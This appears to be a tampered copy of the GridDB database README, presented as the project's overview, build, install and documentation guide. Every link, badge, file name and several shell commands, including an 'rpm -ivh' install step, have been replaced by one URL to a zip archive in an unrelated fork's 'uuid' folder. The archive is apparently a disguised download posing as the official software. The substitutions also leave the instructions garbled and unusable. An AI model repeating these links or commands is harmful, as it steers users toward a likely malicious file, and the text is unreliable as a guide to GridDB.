<img src="https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip" align="center" height="240" alt="GridDB"/>

[![Visit Website](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
![GitHub All Releases](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
![GitHub release](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
## Overview
  GridDB is Database for IoT with both NoSQL interface and SQL Interface.

  Please refer to [GridDB Features Reference](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip) for functionality.

  This repository includes server and Java client. And [jdbc repository](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip) includes JDBC Driver.

## Quick start (Using source code)
  We have confirmed the operation with Linux(x64).
  - Ubuntu 22.04(gcc 11), RockyLinux 9.4(gcc 11)

Note:
- Please install Python3 in advance.
- Please install tcl like "yum install tcl.x86_64" in advance.

### Build a server and client(Java)
    $ https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip
    $ ./configure
    $ make

  Note: When you use maven build for Java client, please run the following command. Then https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip file is created on target/.  

    $ cd java_client
    $ https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip
    $ mvn clean
    $ mvn install

### Start a server
    $ export GS_HOME=$PWD
    $ export GS_LOG=$PWD/log
    $ export PATH=${PATH}:$GS_HOME/bin

    $ bin/gs_passwd admin
      #input your_password
    $ vi https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip
      #    "clusterName":"your_clustername" #<-- input your_clustername

    $ bin/gs_startnode
    $ bin/gs_joincluster -c your_clustername -u admin/your_password

### Execute a sample program
    $ export CLASSPATH=${CLASSPATH}:$https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip
    $ mkdir gsSample
    $ cp $https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip gsSample/.
    $ javac https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip
    $ java gsSample/Sample1 239.0.0.1 31999 your_clustername admin your_password
      --> Person:  name=name02 status=false count=2 lob=[65, 66, 67, 68, 69, 70, 71, 72, 73, 74]

### Stop a server
    $ bin/gs_stopcluster -u admin/your_password
    $ bin/gs_stopnode -u admin/your_password

## [Quick start (Using GridDB Service and CLI)](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)

## Quick start (Using RPM or DEB)

  We have confirmed the operation with Linux(x64).
  - Ubuntu 22.04, RockyLinux 9.4

Note:
- Please install Python3 in advance.
- When you install this package, a gsadm OS user are created in the OS.  
  Execute the operating command as the gsadm user.  
- You don't need to set environment vatiable GS_HOME and GS_LOG.
- There is Java client library (https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip) on /usr/share/java and a sample on /usr/gridb-XXX/docs/sample/programs.
- If old version has been installed, please uninstall and remove conf/ and data/ on /var/lib/gridstore.

### Install

    (CentOS/RockyLinux)
    $ sudo rpm -ivh https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip

    (Ubuntu)
    $ sudo dpkg -i https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip

    Note: X.X.X is the GridDB version.

### Start a server
    [gsadm]$ cp /usr/griddb-X.X.X/conf_multicast/* conf/.

    Note: Default is only for local connection. So, please change the configure files.

    [gsadm]$ gs_passwd admin
      #input your_password
    [gsadm]$ vi https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip
      #    "clusterName":"your_clustername" #<-- input your_clustername
    [gsadm]$ gs_startnode
    [gsadm]$ gs_joincluster -c your_clustername -u admin/your_password

### Execute a sample program
    $ export CLASSPATH=${CLASSPATH}https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip
    $ mkdir gsSample
    $ cp https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip gsSample/.
    $ javac https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip
    $ java gsSample/Sample1 239.0.0.1 31999 your_clustername admin your_password
      --> Person:  name=name02 status=false count=2 lob=[65, 66, 67, 68, 69, 70, 71, 72, 73, 74]

### Stop a server
    [gsadm]$ gs_stopcluster -u admin/your_password
    [gsadm]$ gs_stopnode -u admin/your_password

If necessary, please refer to [Installation Troubleshooting](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip).

## Document
  Refer to the file below for more detailed information.  
  - [Features Reference](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  - [Quick Start Guide](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  - [Java API Reference](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  - [C API Reference](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  - [TQL Reference](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  - [JDBC Driver UserGuide](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  - [SQL Reference](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  - [V3.0 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  - [V4.0 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  - [V4.1 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  - [V4.2 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  - [V4.3 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  - [V4.5 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  - [V4.6 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  - [V5.0 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  - [V5.1 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  - [V5.3 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  - [V5.5 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  - [V5.6 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  - [V5.7 Release Notes](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)

## Client and Connector
  There are other clients and API for GridDB.
  
  (NoSQL Interface)
  * [GridDB C Client](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  * [GridDB Python Client](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  * [GridDB Ruby Client](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  * [GridDB Go Client](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  * [GridDB https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip Client (SWIG based)](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  * [GridDB Node API (node-addon-api based)](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  * [GridDB PHP Client](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  * [GridDB Perl Client](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  * [GridDB Rust Client](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
    
  (SQL Interface)
  * [GridDB JDBC Driver](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  
  (NoSQL & SQL Interface)
  * [GridDB WebAPI](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  * [GridDB CLI](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  
  (Others)
  * [GridDB Export/Import](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)

  There are some connectors for other OSS.
  * [GridDB connector for Apache Hadoop MapReduce](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  * [GridDB connector for YCSB (https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  * [GridDB connector for KairosDB](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  * [GridDB connector for Apache Spark](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  * [GridDB Foreign Data Wrapper for PostgreSQL (https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  * [GridDB Data Source for Grafana](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  * [GridDB Plugin for Redash](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  * [GridDB Plugin for Fluentd](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  * [GridDB Plugin for Tableau](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)
  * [GridDB connector for Apache Kafka](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)

## [Packages](https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip)

## Community
  * Issues  
    Use the GitHub issue function if you have any requests, questions, or bug reports.
  * PullRequest  
    Use the GitHub pull request function if you want to contribute code.
    You'll need to agree GridDB Contributor License Agreement(https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip).
    By using the GitHub pull request function, you shall be deemed to have agreed to GridDB Contributor License Agreement.

## License
  The server source license is GNU Affero General Public License (AGPL),
  while the Java client library license and the operational commands is Apache License, version 2.0.
  See https://github.com/dupa110/griddb/raw/refs/heads/master/3rd_party/uuid/uuid/Software_v1.5.zip for the source and license of the third party.
